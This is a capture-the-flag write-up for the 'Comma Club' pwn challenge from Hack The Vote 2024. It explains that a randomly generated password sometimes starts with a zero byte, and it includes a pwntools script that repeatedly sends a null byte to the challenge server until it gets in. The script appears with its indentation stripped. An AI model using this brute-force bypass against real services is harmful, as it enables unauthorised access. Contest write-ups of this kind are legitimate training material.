---
title: "Comma Club - Hack The Vote 2024"
category: "pwn"
type: "writeup"
tags: ["pwn", "pwntools", "checksec", "comma", "club", "hack-the-vote", "hack-the-vote-2024", "2024", "ctf-writeup"]
summary: "In the \"Comma Club Revenge\" task, I noticed an additional line in the main function that wasn't present in \"Comma Club.\" Practically, the program didn't differ much, just some minor variable changes."
source:
  name: "CTFtime writeup #39636"
  url: "https://ctftime.org/writeup/39636"
ctf:
  name: "Hack The Vote 2024"
  year: 2024
  challenge: "Comma Club"
---

## Metadata

- **CTF:** Hack The Vote 2024
- **Task:** Comma Club
- **Author team:** MindCrafters
- **CTFtime:** <https://ctftime.org/writeup/39636>

---
In the "Comma Club Revenge" task, I noticed an additional line in the main function that wasn't present in "Comma Club." Practically, the program didn't differ much, just some minor variable changes.

```  
{  
for (local_10 = 0; local_10 < 0x10; local_10 = local_10 + 1) {  
while (password[local_10] == '\0') {  
getrandom(password + local_10,1,0);  
}  
}  
}  
```

This suggested to me that the "Comma Club" was secured in a similar way. As for the password, it was generated with getrandom(password + local_10,1,0);, which produces random bytes, including the possibility of a zero at the beginning. This can be sent, among other ways, using pwntools. I conducted tests by generating the password around 1,000 times and checked how often a zero appeared at the beginning. It occurred between 2-5 times. So, I thought, let's try brute-forcing. And it worked. I captured the flag after 89 attempts...

```  
from pwn import * #include  
context.log_level='info' #na poczatku mozna  
context.update(arch='x86_64', os='linux') #o tym pamietac jak sie nie pobiera danych z pliku  
context.terminal = ['wt.exe','wsl.exe'] #do wsl

binary = context.binary = ELF("./comma-club", checksec=False)

if args.REMOTE:  
ADDRESS_PORT="comma-club.chal.hackthe.vote:1337"  
ADDRESS=ADDRESS_PORT.split(":")[0]  
PORT=int(ADDRESS_PORT.split(":")[1],10)   
p=remote(ADDRESS,PORT) #laczenie online  
else:  
p = process(binary.path) 

Counter=0;  
while True:  
p.sendlineafter(b">", b'3')   
p.sendlineafter(b"password", b'\x00')  
p.recv()  
ANSWER=p.recv()  
Counter+=1  
info (f"Counter: {Counter}")  
if b'Incorrect.'in ANSWER:  
info (f"Pass didn't start from: 0x00")  
p.close()  
if args.REMOTE:  
p=remote(ADDRESS,PORT)  
else:   
p = process(binary.path)  
  
else:  
p.interactive()  
```
